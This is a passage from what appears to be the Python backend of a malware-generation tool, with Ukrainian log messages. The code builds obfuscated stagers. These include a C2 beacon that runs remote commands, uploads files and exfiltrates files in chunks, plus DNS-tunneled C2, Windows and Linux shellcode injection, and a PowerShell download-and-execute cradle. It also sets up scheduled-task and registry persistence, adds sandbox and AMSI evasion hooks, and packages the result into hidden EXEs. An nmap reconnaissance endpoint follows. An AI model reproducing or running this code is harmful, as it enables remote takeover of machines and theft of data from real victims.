            "                    print(f\"[PAYLOAD_EXFIL_ERROR] Помилка читання чанка файлу: {{e_exfil_read}}\")",
            "                    if exfil_state['file_handle']: exfil_state['file_handle'].close()",
            "                    exfil_state = {'active': False, 'file_path': None, 'file_handle': None, 'chunk_size': 512, 'current_chunk': 0, 'total_chunks': 0}",
            "                    current_beacon_payload['file_exfil_error'] = str(e_exfil_read)",
            "",
            "            try:",
            "                print(f\"[PAYLOAD_BEACON] Надсилання маячка на {{beacon_url}} з даними: {{ {k: (v[:50] + '...' if isinstance(v, str) and len(v) > 50 else v) for k,v in current_beacon_payload.items()} }}\")",
            "                data_encoded = json_stager_module.dumps(current_beacon_payload).encode('utf-8')",
            "                req = urllib.request.Request(beacon_url, data=data_encoded, headers={'Content-Type': 'application/json', 'User-Agent': 'SyntaxBeaconClient/1.0'})",
            "                with urllib.request.urlopen(req, timeout=20) as response:",
            "                    response_data_raw = response.read().decode('utf-8')",
            "                    print(f\"[PAYLOAD_BEACON] Відповідь C2 (статус {{response.status}}): {{response_data_raw[:200]}}...\")",
            "                    c2_response_parsed = json_stager_module.loads(response_data_raw)",
            "                    next_task = c2_response_parsed.get('c2_response', {}).get('next_task')",
            "",
            "                if next_task and next_task.get('task_type'):",
            "                    task_id = next_task.get('task_id')",
            "                    task_type = next_task.get('task_type')",
            "                    task_params_str = next_task.get('task_params', '')",
            "                    print(f\"[PAYLOAD_TASK] Отримано завдання ID: {{task_id}}, Тип: {{task_type}}, Парам: '{{task_params_str}}'\")",
            "                    task_output = ''",
            "                    task_success = False",
            "                    try:",
            "                        if task_type == 'exec_command':",
            "                            cmd_parts = shlex.split(task_params_str)",
            "                            print(f\"[PAYLOAD_TASK_EXEC] Виконання команди: {{cmd_parts}}\")",
            "                            proc = subprocess.run(cmd_parts, capture_output=True, text=True, shell=False, timeout=20, encoding='utf-8', errors='ignore')",
            "                            task_output = f'STDOUT:\\n{{proc.stdout}}\\nSTDERR:\\n{{proc.stderr}}'",
            "                            task_success = proc.returncode == 0",
            "                        elif task_type == 'list_directory':",
            "                            path_to_list = task_params_str if task_params_str else '.'",
            "                            print(f\"[PAYLOAD_TASK_EXEC] Перелік директорії: {{path_to_list}}\")",
            "                            listed_items = os.listdir(path_to_list)",
            "                            task_output = f\"Перелік '{path_to_list}':\\n\" + \"\\n\".join(listed_items)",
            "                            task_success = True",
            "                        elif task_type == 'get_system_info':",
            "                            task_output = f'Hostname: {{socket.gethostname()}}\\nOS: {{os.name}}\\nUser: {{implant_data[\"username\"]}}'",
            "                            task_success = True",
            "                        elif task_type == 'exfiltrate_file_chunked':",
            "                            file_to_exfil = task_params_str",
            "                            print(f\"[PAYLOAD_TASK_EXFIL_INIT] Ініціалізація ексфільтрації файлу: {{file_to_exfil}}\")",
            "                            if os.path.exists(file_to_exfil) and os.path.isfile(file_to_exfil):",
            "                                exfil_state['file_path'] = file_to_exfil",
            "                                exfil_state['file_handle'] = open(file_to_exfil, 'rb')",
            "                                exfil_state['current_chunk'] = 0",
            "                                file_size = os.path.getsize(file_to_exfil)",
            "                                exfil_state['total_chunks'] = (file_size + exfil_state['chunk_size'] - 1) // exfil_state['chunk_size']",
            "                                exfil_state['active'] = True",
            "                                task_output = f'Розпочато ексфільтрацію файлу {{file_to_exfil}}. Розмір: {{file_size}} байт, Чанків: {{exfil_state[\"total_chunks\"]}}.'",
            "                                task_success = True",
            "                            else:",
            "                                task_output = f'Помилка ексфільтрації: Файл {{file_to_exfil}} не знайдено або не є файлом.'",
            "                                task_success = False",
            "                        elif task_type == 'upload_file_b64':",
            "                            upload_params = json_stager_module.loads(task_params_str)",
            "                            remote_upload_path = upload_params.get('path')",
            "                            file_content_b64 = upload_params.get('content_b64')",
            "                            if remote_upload_path and file_content_b64:",
            "                                print(f\"[PAYLOAD_TASK_UPLOAD] Завантаження файлу на {{remote_upload_path}} (розмір B64: {{len(file_content_b64)}})\")",
            "                                try:",
            "                                    decoded_file_content = base64.b64decode(file_content_b64.encode('utf-8'))",
            "                                    with open(remote_upload_path, 'wb') as f_upload:",
            "                                        f_upload.write(decoded_file_content)",
            "                                    task_output = f'Файл успішно завантажено на {{remote_upload_path}}.'",
            "                                    task_success = True",
            "                                except Exception as e_upload:",
            "                                    task_output = f'Помилка запису завантаженого файлу {{remote_upload_path}}: {{e_upload}}'",
            "                                    task_success = False",
            "                            else:",
            "                                task_output = 'Помилка завдання upload_file_b64: відсутній шлях або вміст.'",
            "                                task_success = False",
            "                        else:",
            "                            task_output = f'Невідомий тип завдання: {{task_type}}'",
            "                            task_success = False",
            "                        print(f\"[PAYLOAD_TASK_RESULT] Результат завдання '{{task_type}}':\\n{{task_output[:300]}}{{'...' if len(task_output) > 300 else ''}}\")",
            "                    except Exception as e_task_exec:",
            "                        task_output = f'Помилка виконання завдання {{task_type}}: {{str(e_task_exec)}}'",
            "                        task_success = False",
            "                        print(f\"[PAYLOAD_TASK_ERROR] {{task_output}}\")",
            "                    last_task_result_package = {'task_id': task_id, 'result': task_output, 'success': task_success}",
            "                    continue ",
            "                else:",
            "                    print(f\"[PAYLOAD_BEACON] Нових завдань від C2 не отримано.\")",
            "                    last_task_result_package = None",
            "",
            "            except urllib.error.URLError as e_url:",
            "                print(f\"[PAYLOAD_BEACON_ERROR] Помилка мережі (URLError) під час відправки маячка: {{e_url}}. Повторна спроба через {{BEACON_INTERVAL_SEC}} сек.\")",
            "            except socket.timeout:",
            "                print(f\"[PAYLOAD_BEACON_ERROR] Таймаут під час відправки маячка. Повторна спроба через {{BEACON_INTERVAL_SEC}} сек.\")",
            "            except json_stager_module.JSONDecodeError as e_json:",
            "                response_data_raw_local = response_data_raw if 'response_data_raw' in locals() else 'N/A'",
            "                print(f\"[PAYLOAD_BEACON_ERROR] Помилка декодування JSON відповіді від C2: {{e_json}}. Відповідь: {{response_data_raw_local}}\")",
            "            except Exception as e_beacon_loop:",
            "                print(f\"[PAYLOAD_BEACON_ERROR] Загальна помилка в циклі маячка: {{e_beacon_loop}}. Повторна спроба через {{BEACON_INTERVAL_SEC}} сек.\")",
            "            ",
            "            if not next_task and not exfil_state['active']:",
            "                print(f\"[PAYLOAD_BEACON] Очікування {{BEACON_INTERVAL_SEC}} секунд до наступного маячка...\")",
            "                time.sleep(BEACON_INTERVAL_SEC)",
            "            elif exfil_state['active']:",
            "                 time.sleep(random.uniform(0.1, 0.5))",
            "    elif arch_type == 'dns_beacon_c2_concept':",
            # ... (код dns_beacon_c2_concept з v1.9.5) ...
            "        c2_zone = payload_params.get('dns_zone')",
            "        dns_prefix = DNS_BEACON_SUBDOMAIN_PREFIX",
            "        implant_id_dns = STAGER_IMPLANT_ID",
            "        beacon_interval = DNS_BEACON_INTERVAL_SEC",
            "        last_task_result_dns = None",
            "",
            "        def encode_data_for_dns(data_dict):",
            "            try:",
            "                json_data = json_stager_module.dumps(data_dict, separators=(',', ':'))",
            "                encoded_full = base64.b32encode(json_data.encode('utf-8')).decode('utf-8').rstrip('=').lower()",
            "                chunk_size = 60",
            "                return [encoded_full[i:i + chunk_size] for i in range(0, len(encoded_full), chunk_size)]",
            "            except Exception as e_enc:",
            "                print(f\"[DNS_BEACON_ERROR] Помилка кодування даних: {{e_enc}}\")",
            "                return [\"encodeerror\"]",
            "",
            "        print(f\"[PAYLOAD_DNS_BEACON] Ініціалізація DNS C2. Зона: {{c2_zone}}, Префікс: {{dns_prefix}}, ID: {{implant_id_dns}}\")",
            "        while True:",
            "            beacon_data_to_send = {'id': implant_id_dns, 'status': 'beaconing_dns'}",
            "            if last_task_result_dns:",
            "                beacon_data_to_send['last_task_id'] = last_task_result_dns.get('task_id')",
            "                beacon_data_to_send['result'] = last_task_result_dns.get('result_summary', 'No summary')",
            "                last_task_result_dns = None",
            "",
            "            encoded_data_chunks = encode_data_for_dns(beacon_data_to_send)",
            "            next_task_dns = None",
            "            for chunk_idx, data_chunk in enumerate(encoded_data_chunks):",
            "                query_hostname = f\"{{data_chunk}}.p{{chunk_idx}}.{{implant_id_dns.lower().replace('-', '')[:10]}}.{{dns_prefix}}.{{c2_zone}}\"",
            "                print(f\"[PAYLOAD_DNS_BEACON] Симуляція DNS-запиту (тип A/TXT) для: {{query_hostname}}\")",
            "                sim_c2_dns_url = f'http://localhost:5000/api/c2/dns_resolver_sim?q={{query_hostname}}&id={{implant_id_dns}}'",
            "                try:",
            "                    print(f\"[PAYLOAD_DNS_BEACON] Симуляція запиту до DNS Resolver (через HTTP): {{sim_c2_dns_url}}\")",
            "                    req = urllib.request.Request(sim_c2_dns_url, headers={'User-Agent': 'SyntaxDNSBeaconClient/1.0'})",
            "                    with urllib.request.urlopen(req, timeout=10) as response:",
            "                        dns_response_raw = response.read().decode('utf-8')",
            "                        print(f\"[PAYLOAD_DNS_BEACON] Відповідь від симулятора DNS Resolver: {{dns_response_raw[:200]}}...\")",
            "                        dns_response_parsed = json_stager_module.loads(dns_response_raw)",
            "                        if dns_response_parsed.get('success') and dns_response_parsed.get('dns_txt_response_payload'):",
            "                            task_data_b64 = dns_response_parsed['dns_txt_response_payload']",
            "                            decoded_task_json_bytes = base64.b64decode(task_data_b64.encode('utf-8'))",
            "                            decoded_task_json_str = decoded_task_json_bytes.decode('utf-8')",
            "                            next_task_dns = json_stager_module.loads(decoded_task_json_str)",
            "                            print(f\"[PAYLOAD_DNS_BEACON] Розкодовано завдання з DNS TXT: {{next_task_dns}}\")",
            "                        elif dns_response_parsed.get('success') and dns_response_parsed.get('task_data'):",
            "                            next_task_dns = dns_response_parsed.get('task_data')",
            "                except Exception as e_dns_sim_http:",
            "                    print(f\"[PAYLOAD_DNS_BEACON_ERROR] Помилка HTTP-запиту до симулятора DNS: {{e_dns_sim_http}}\")",
            "                if next_task_dns: break ",
            "",
            "            if next_task_dns and next_task_dns.get('task_type'):",
            "                task_id = next_task_dns.get('task_id')",
            "                task_type = next_task_dns.get('task_type')",
            "                task_params_str = next_task_dns.get('task_params', '')",
            "                print(f\"[PAYLOAD_DNS_TASK] Отримано завдання (через DNS) ID: {{task_id}}, Тип: {{task_type}}, Парам: '{{task_params_str}}'\")",
            "                task_output = f'DNS_TASK_SIM_RESULT: {{task_type}} ({{task_params_str}}) - OK'",
            "                last_task_result_dns = {'task_id': task_id, 'result_summary': task_output[:50]}",
            "                time.sleep(random.uniform(0.5, 1.0))",
            "            else:",
            "                print(f\"[PAYLOAD_DNS_BEACON] Нових завдань через DNS не отримано.\")",
            "                last_task_result_dns = None",
            "            ",
            "            print(f\"[PAYLOAD_DNS_BEACON] Очікування {{beacon_interval}} секунд до наступного DNS маячка...\")",
            "            time.sleep(beacon_interval)",
            "    elif arch_type == 'demo_file_lister_payload':",
            # ... (код demo_file_lister_payload з v1.9.5) ...
            "        try:",
            "            target_dir = payload_params.get('directory', '.')",
            "            target_dir = target_dir if target_dir and target_dir.strip() != '.' else os.getcwd()",
            "            files = os.listdir(target_dir)",
            "            print(f\"[PAYLOAD ({{arch_type}})] Перелік директорії '{{target_dir}}': {{files[:5]}} {'...' if len(files) > 5 else ''}\")",
            "        except Exception as e_list:",
            "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка переліку директорії '{{payload_params.get('directory')}}': {{e_list}}\")",
            "    elif arch_type == 'demo_echo_payload':",
            # ... (код demo_echo_payload з v1.9.5) ...
            "        print(f\"[PAYLOAD ({{arch_type}})] Відлуння: {{payload_params.get('message')}}\")",
            "    elif arch_type == 'reverse_shell_tcp_shellcode_windows_x64':",
            # ... (код reverse_shell_tcp_shellcode_windows_x64 з v1.9.5) ...
            "        print(f\"[PAYLOAD ({{arch_type}})] Спроба ін'єкції шеллкоду для Windows x64...\")",
            "        try:",
            "            shellcode_hex = payload_params.get('shellcode')",
            "            if not shellcode_hex or len(shellcode_hex) % 2 != 0:",
            "                print(\"[PAYLOAD_ERROR] Невірний формат шістнадцяткового шеллкоду (порожній або непарна довжина).\")",
            "                return",
            "            shellcode_bytes = bytes.fromhex(shellcode_hex)",
            "            print(f\"[PAYLOAD_INFO] Розмір шеллкоду: {{len(shellcode_bytes)}} байт.\")",
            "            kernel32 = ctypes.windll.kernel32",
            "            MEM_COMMIT = 0x00001000",
            "            MEM_RESERVE = 0x00002000",
            "            PAGE_EXECUTE_READWRITE = 0x40",
            "            print(\"[PAYLOAD_INFO] Виділення пам'яті...\")",
            "            ptr = kernel32.VirtualAlloc(None, len(shellcode_bytes), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)",
            "            if not ptr:",
            "                print(f\"[PAYLOAD_ERROR] Помилка VirtualAlloc: {{ctypes.WinError()}}\")",
            "                return",
            "            print(f\"[PAYLOAD_INFO] Пам'ять виділено за адресою: {{hex(ptr)}}.\")",
            "            buffer = (ctypes.c_char * len(shellcode_bytes)).from_buffer_copy(shellcode_bytes)",
            "            kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), buffer, len(shellcode_bytes))",
            "            print(\"[PAYLOAD_INFO] Шеллкод скопійовано в пам'ять.\")",
            "            print(\"[PAYLOAD_INFO] Створення потоку для виконання шеллкоду...\")",
            "            thread_id = ctypes.c_ulong(0)",
            "            handle = kernel32.CreateThread(None, 0, ctypes.c_void_p(ptr), None, 0, ctypes.byref(thread_id))",
            "            if not handle:",
            "                print(f\"[PAYLOAD_ERROR] Помилка CreateThread: {{ctypes.WinError()}}\")",
            "                kernel32.VirtualFree(ctypes.c_void_p(ptr), 0, 0x00008000)",
            "                return",
            "            print(f\"[PAYLOAD_SUCCESS] Шеллкод запущено в потоці ID: {{thread_id.value}}. Handle: {{handle}}.\")",
            "        except Exception as e_shellcode_win:",
            "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка під час ін'єкції шеллкоду Windows: {{e_shellcode_win}}\")",
            "    elif arch_type == 'reverse_shell_tcp_shellcode_linux_x64':",
            # ... (код reverse_shell_tcp_shellcode_linux_x64 з v1.9.5) ...
            "        print(f\"[PAYLOAD ({{arch_type}})] Спроба ін'єкції шеллкоду для Linux x64...\")",
            "        try:",
            "            shellcode_hex = payload_params.get('shellcode')",
            "            if not shellcode_hex or len(shellcode_hex) % 2 != 0:",
            "                print(\"[PAYLOAD_ERROR] Невірний формат шістнадцяткового шеллкоду (порожній або непарна довжина).\")",
            "                return",
            "            shellcode_bytes = bytes.fromhex(shellcode_hex)",
            "            print(f\"[PAYLOAD_INFO] Розмір шеллкоду: {{len(shellcode_bytes)}} байт.\")",
            "            libc = ctypes.CDLL(None)",
            "            PROT_READ = 0x1",
            "            PROT_WRITE = 0x2",
            "            PROT_EXEC = 0x4",
            "            MAP_PRIVATE = 0x02",
            "            MAP_ANONYMOUS = 0x20",
            "            mmap_syscall = libc.mmap",
            "            mmap_syscall.restype = ctypes.c_void_p",
            "            mmap_syscall.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_long]",
            "            print(\"[PAYLOAD_INFO] Виділення пам'яті через mmap...\")",
            "            mem_ptr = mmap_syscall(None, len(shellcode_bytes), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)",
            "            if mem_ptr == -1 or mem_ptr == 0:",
            "                err_no = ctypes.get_errno()",
            "                print(f\"[PAYLOAD_ERROR] Помилка mmap: {{os.strerror(err_no)}} (errno: {{err_no}})\")",
            "                return",
            "            print(f\"[PAYLOAD_INFO] Пам'ять виділено за адресою: {{hex(mem_ptr)}}.\")",
            "            ctypes.memmove(mem_ptr, shellcode_bytes, len(shellcode_bytes))",
            "            print(\"[PAYLOAD_INFO] Шеллкод скопійовано в пам'ять.\")",
            "            print(\"[PAYLOAD_INFO] Створення вказівника на функцію та виклик шеллкоду...\")",
            "            shellcode_func_type = ctypes.CFUNCTYPE(None)",
            "            shellcode_function = shellcode_func_type(mem_ptr)",
            "            shellcode_function()",
            "            print(\"[PAYLOAD_SUCCESS] Шеллкод для Linux x64 (начебто) виконано.\")",
            "        except Exception as e_shellcode_linux:",
            "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка під час ін'єкції шеллкоду Linux: {{e_shellcode_linux}}\")",
            "    elif arch_type == 'powershell_downloader_stager':",
            # ... (код powershell_downloader_stager з v1.9.5) ...
            "        print(f\"[PAYLOAD ({{arch_type}})] Спроба завантаження та виконання PowerShell скрипта з URL: {{payload_params.get('ps_url')}}\")",
            "        try:",
            "            ps_command_to_run = f\"IEX (New-Object Net.WebClient).DownloadString('{payload_params.get('ps_url')}')\"",
            "            full_command = ['powershell.exe']",
            "            if POWERSHELL_EXEC_ARGS:",
            "                full_command.extend(POWERSHELL_EXEC_ARGS.split())",
            "            full_command.extend(['-Command', ps_command_to_run])",
            "            print(f\"[PAYLOAD_INFO] Виконання команди: {{' '.join(full_command)}}\")",
            "            result = subprocess.run(full_command, capture_output=True, text=True, check=False)",
            "            if result.returncode == 0:",
            "                print(f\"[PAYLOAD_SUCCESS] PowerShell скрипт успішно виконано. STDOUT (перші 100 символів): {{result.stdout[:100]}}...\")",
            "            else:",
            "                print(f\"[PAYLOAD_ERROR] Помилка виконання PowerShell скрипта (код: {{result.returncode}}). STDERR: {{result.stderr}}\")",
            "        except Exception as e_ps_download:",
            "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка під час завантаження/виконання PowerShell: {{e_ps_download}}\")",
            "    elif arch_type == 'windows_simple_persistence_stager':",
            # ... (код windows_simple_persistence_stager з v1.9.5) ...
            "        method = payload_params.get('persistence_method')",
            "        command = payload_params.get('command_to_persist')",
            "        name = payload_params.get('artifact_name')",
            "        print(f\"[PAYLOAD_PERSISTENCE] Встановлення персистентності. Метод: {{method}}, Команда: '{{command}}', Ім'я: '{{name}}'\")",
            "        persist_cmd_parts = []",
            "        success_msg = ''",
            "        if os.name != 'nt':",
            "            print(\"[PAYLOAD_PERSISTENCE_ERROR] Цей архетип призначений тільки для Windows.\")",
            "            return",
            "        try:",
            "            if method == 'scheduled_task':",
            "                persist_cmd_parts = ['schtasks', '/create', '/tn', name, '/tr', command, '/sc', 'ONLOGON', '/f']",
            "                success_msg = f\"Заплановане завдання '{{name}}' для команди '{{command}}' (начебто) створено.\"",
            "            elif method == 'registry_run_key':",
            "                registry_path = r\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"",
            "                persist_cmd_parts = ['reg', 'add', registry_path, '/v', name, '/t', 'REG_SZ', '/d', command, '/f']",
            "                success_msg = f\"Запис реєстру '{{name}}' в '{{registry_path}}' для команди '{{command}}' (начебто) створено.\"",
            "            else:",
            "                print(f\"[PAYLOAD_PERSISTENCE_ERROR] Невідомий метод персистентності: {{method}}\")",
            "                return",
            "",
            "            print(f\"[PAYLOAD_PERSISTENCE_EXEC] Виконання команди: {{' '.join(persist_cmd_parts)}}\")",
            "            proc = subprocess.run(persist_cmd_parts, capture_output=True, text=True, shell=False, check=False, encoding='cp866', errors='ignore')",
            "            if proc.returncode == 0:",
            "                print(f\"[PAYLOAD_PERSISTENCE_SUCCESS] {{success_msg}}\")",
            "                print(f\"  STDOUT: {{proc.stdout}}\")",
            "            else:",
            "                print(f\"[PAYLOAD_PERSISTENCE_ERROR] Помилка встановлення персистентності (код: {{proc.returncode}}):\")",
            "                print(f\"  STDOUT: {{proc.stdout}}\")",
            "                print(f\"  STDERR: {{proc.stderr}}\")",
            "        except Exception as e_persist:",
            "            print(f\"[PAYLOAD_PERSISTENCE_FATAL_ERROR] Непередбачена помилка: {{e_persist}}\")",
            "",
            "if __name__ == '__main__':",
            "    print(f\"[STAGER] Стейджер для '{archetype_name}' запускається...\")",
            "    sandbox_detected_flag = False",
            "    if EVASION_CHECKS_APPLIED or AMSI_BYPASS_CONCEPT_APPLIED or DISK_SIZE_CHECK_APPLIED:",
            f"        sandbox_detected_flag = {evasion_func_name_runtime}()",
            "    if not sandbox_detected_flag:",
            f"        decoded_payload_parameters_json = {decode_func_name_runtime}(OBF_DATA_B64, OBFUSCATION_KEY_EMBEDDED)",
            "        if \"DECODE_ERROR\" in decoded_payload_parameters_json:",
            "            print(f\"[STAGER_ERROR] Не вдалося розшифрувати параметри пейлоада: {{decoded_payload_parameters_json}}\")",
            "        else:",
            f"            {execute_func_name_runtime}(decoded_payload_parameters_json, \"{archetype_name}\")",
            "    else:",
            "        print(\"[STAGER] Виявлено аналітичне середовище, нормальний шлях виконання пропущено.\")",
            "    print(\"[STAGER] Стейджер завершив роботу.\")"
        ])
        stager_code_raw = "\n".join(stager_code_lines)

        if validated_params.get('enable_stager_metamorphism', False):
            log_messages.append("[BACKEND_METAMORPH_INFO] Застосування розширеного метаморфізму до Python-стейджера...")
            stager_code_raw_for_metamorph = stager_code_raw
            stager_code_raw_for_metamorph = obfuscate_string_literals_in_python_code(stager_code_raw_for_metamorph, key, log_messages)
            stager_code_raw_list_for_cfo = stager_code_raw_for_metamorph.splitlines()
            stager_code_raw_for_metamorph = apply_advanced_cfo_be(stager_code_raw_list_for_cfo, log_messages)
            final_decode_name = generate_random_var_name(prefix="unveil_")
            final_evasion_name = generate_random_var_name(prefix="audit_")
            final_execute_name = generate_random_var_name(prefix="dispatch_")
            stager_code_raw_for_metamorph = re.sub(rf"\b{decode_func_name_runtime}\b", final_decode_name, stager_code_raw_for_metamorph)
            stager_code_raw_for_metamorph = re.sub(rf"\b{evasion_func_name_runtime}\b", final_evasion_name, stager_code_raw_for_metamorph)
            stager_code_raw_for_metamorph = re.sub(rf"\b{execute_func_name_runtime}\b", final_execute_name, stager_code_raw_for_metamorph)
            log_messages.append(f"[BACKEND_METAMORPH_SUCCESS] Метаморфізм застосовано (ключові функції: {final_decode_name}, {final_evasion_name}, {final_execute_name}).")
            stager_code_raw = stager_code_raw_for_metamorph

        output_format = validated_params.get("output_format")
        final_stager_output = ""

        if output_format == "pyinstaller_exe_windows":
            log_messages.append("[BACKEND_PYINSTALLER_INFO] Обрано формат PyInstaller EXE.")
            pyinstaller_path = shutil.which("pyinstaller")
            if not pyinstaller_path:
                log_messages.append("[BACKEND_PYINSTALLER_ERROR] PyInstaller не знайдено в системному PATH. Повернення Base64 Python-коду.")
                final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
                log_messages.append("\n[ПРИМІТКА] PyInstaller не знайдено. Повернений Base64 представляє Python-код стейджера.")
            else:
                log_messages.append(f"[BACKEND_PYINSTALLER_INFO] PyInstaller знайдено: {pyinstaller_path}")
                pyinstaller_options_str = validated_params.get("pyinstaller_options", "--onefile --noconsole")
                pyinstaller_options = shlex.split(pyinstaller_options_str)
                with tempfile.TemporaryDirectory() as tmpdir:
                    log_messages.append(f"[BACKEND_PYINSTALLER_INFO] Створено тимчасову директорію: {tmpdir}")
                    temp_py_filename = os.path.join(tmpdir, "stager_to_compile.py")
                    with open(temp_py_filename, "w", encoding="utf-8") as f:
                        f.write(stager_code_raw)
                    log_messages.append(f"[BACKEND_PYINSTALLER_INFO] Python-стейджер збережено у: {temp_py_filename}")
                    base_script_name = os.path.splitext(os.path.basename(temp_py_filename))[0]
                    dist_path = os.path.join(tmpdir, "dist")
                    work_path = os.path.join(tmpdir, "build")
                    pyinstaller_cmd = [
                        pyinstaller_path,
                        *pyinstaller_options,
                        "--distpath", dist_path,
                        "--workpath", work_path,
                        "--specpath", tmpdir,
                        temp_py_filename
                    ]
                    log_messages.append(f"[BACKEND_PYINSTALLER_INFO] Запуск PyInstaller: {' '.join(pyinstaller_cmd)}")
                    try:
                        compile_process = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, check=False, timeout=300)
                        log_messages.append(f"[BACKEND_PYINSTALLER_STDOUT] {compile_process.stdout}")
                        if compile_process.returncode != 0:
                            log_messages.append(f"[BACKEND_PYINSTALLER_ERROR] Помилка PyInstaller (код: {compile_process.returncode}): {compile_process.stderr}")
                            final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
                            log_messages.append("\n[ПРИМІТКА] Помилка компіляції PyInstaller. Повернений Base64 представляє Python-код стейджера.")
                        else:
                            compiled_exe_path = os.path.join(dist_path, base_script_name + ".exe")
                            if os.path.exists(compiled_exe_path):
                                log_messages.append(f"[BACKEND_PYINSTALLER_SUCCESS] .EXE файл успішно створено: {compiled_exe_path}")
                                with open(compiled_exe_path, "rb") as f_exe:
                                    exe_bytes = f_exe.read()
                                final_stager_output = base64.b64encode(exe_bytes).decode('utf-8')
                                log_messages.append(f"[BACKEND_PYINSTALLER_INFO] .EXE файл закодовано в Base64 (довжина: {len(final_stager_output)}).")
                            else:
                                log_messages.append(f"[BACKEND_PYINSTALLER_ERROR] .EXE файл не знайдено у {dist_path} після компіляції.")
                                final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
                                log_messages.append("\n[ПРИМІТКА] .EXE файл не знайдено. Повернений Base64 представляє Python-код стейджера.")
                    except subprocess.TimeoutExpired:
                        log_messages.append("[BACKEND_PYINSTALLER_ERROR] Час очікування PyInstaller вичерпано.")
                        final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
                        log_messages.append("\n[ПРИМІТКА] Таймаут PyInstaller. Повернений Base64 представляє Python-код стейджера.")
                    except Exception as e_pyinst:
                        log_messages.append(f"[BACKEND_PYINSTALLER_FATAL] Непередбачена помилка під час компіляції PyInstaller: {str(e_pyinst)}")
                        final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
                        log_messages.append("\n[ПРИМІТКА] Непередбачена помилка PyInstaller. Повернений Base64 представляє Python-код стейджера.")
                log_messages.append(f"[BACKEND_PYINSTALLER_INFO] Тимчасову директорію {tmpdir} видалено.")

        elif output_format == "base64_encoded_stager":
            final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
            log_messages.append("[BACKEND_FORMAT_INFO] Стейджер Base64.")
        else:
            final_stager_output = stager_code_raw
            log_messages.append("[BACKEND_FORMAT_INFO] Raw Python Стейджер.")

        log_messages.append("[BACKEND_SUCCESS] Пейлоад згенеровано.")
        time.sleep(0.2)
        return jsonify({"success": True, "stagerCode": final_stager_output, "generationLog": "\n".join(log_messages)}), 200
    except Exception as e:
        print(f"SERVER ERROR (generate_payload): {str(e)}"); import traceback; traceback.print_exc()
        log_messages.append(f"[BACKEND_FATAL_ERROR] {str(e)}")
        return jsonify({"success": False, "error": "Server error", "generationLog": "\n".join(log_messages)}), 500

@app.route('/api/run_recon', methods=['POST'])
def handle_run_recon():
    log_messages = [f"[BACKEND v{VERSION_BACKEND}] Запит /api/run_recon о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
    try:
        data = request.get_json()
        if not data: return jsonify({"success": False, "error": "No JSON for recon", "reconLog": "\n".join(log_messages+["[BE_ERR] No JSON."])}), 400

        target = data.get("target")
        recon_type = data.get("recon_type")
        nmap_options_str = data.get("nmap_options_str", "")
        log_messages.append(f"[BACKEND_INFO] Розвідка: Ціль='{target}', Тип='{recon_type}', Опції Nmap='{nmap_options_str}'.")

        if not target or not recon_type: return jsonify({"success": False, "error": "Missing params (target or recon_type)", "reconLog": "\n".join(log_messages+["[BE_ERR] Missing params."])}), 400

        recon_results_text = ""
        recon_log_additions = []
        
        if recon_type == "port_scan_basic":
            recon_log_additions, recon_results_text = simulate_port_scan_be(target)
        elif recon_type == "osint_email_search":
            recon_log_additions, recon_results_text = simulate_osint_email_search_be(target)
        elif recon_type == "osint_subdomain_search_concept":
            recon_log_additions, recon_results_text = simulate_osint_subdomain_search_be(target)
        elif recon_type == "port_scan_nmap_standard":
            nmap_options_list = shlex.split(nmap_options_str) if nmap_options_str else []
            # Для стандартного сканування use_xml_output=False, щоб отримати текстовий вивід
            recon_log_additions, raw_nmap_output, _, _ = perform_nmap_scan_be(target, options=nmap_options_list, use_xml_output=False, recon_type_hint=recon_type)
            recon_results_text = f"Результати Nmap сканування для: {target}\n\n{raw_nmap_output}"
        
        elif recon_type == "port_scan_nmap_cve_basic" or recon_type == "port_scan_nmap_vuln_scripts":
            nmap_options_list = shlex.split(nmap_options_str) if nmap_options_str else []
            # Для CVE та Vuln Scripts завжди потрібен XML для детального парсингу
            recon_log_additions_nmap, nmap_xml_data, parsed_services_nmap, parsed_os_nmap = perform_nmap_scan_be(target, options=nmap_options_list, use_xml_output=True, recon_type_hint=recon_type)
            recon_log_additions.extend(recon_log_additions_nmap)

            # Генерація форматованого звіту
            report_lines = [f"Nmap Scan Report for: {target} (Type: {recon_type})"]
            report_lines.append("="*40)

            if "Помилка" in nmap_xml_data or "nmap не знайдено" in nmap_xml_data or "вичерпано" in nmap_xml_data : # Якщо nmap повернув помилку
                report_lines.append("\nNmap Execution Issues:")
                report_lines.append(nmap_xml_data) # Показуємо текст помилки
            else:
                # Інформація про ОС та Хост-скрипти
                report_lines.append("\n--- Host Information & OS Detection ---")
                if parsed_os_nmap:
                    for os_entry in parsed_os_nmap:
                        report_lines.append(f"Host: {os_entry.get('host_ip', 'N/A')}")
                        if os_entry.get('name') != "N/A (Host Scripts Only)": # Не показувати, якщо це фіктивний запис для хост-скриптів
                            report_lines.append(f"  OS Name: {os_entry.get('name', 'N/A')} (Accuracy: {os_entry.get('accuracy', 'N/A')}%")
                            if os_entry.get('family'): report_lines.append(f"  Family: {os_entry['family']}")
                            if os_entry.get('generation'): report_lines.append(f"  Generation: {os_entry['generation']}")
                            if os_entry.get('cpes'): report_lines.append(f"  OS CPEs: {', '.join(os_entry['cpes'])}")
                        
                        if os_entry.get("host_scripts"):
                            report_lines.append("  Host Scripts:")
                            for script_info in os_entry["host_scripts"]:
                                report_lines.append(f"    Script ID: {script_info['id']}")
                                if script_info['output']: report_lines.append(f"      Output: {script_info['output'].strip()}")
                                if script_info['structured_data']:
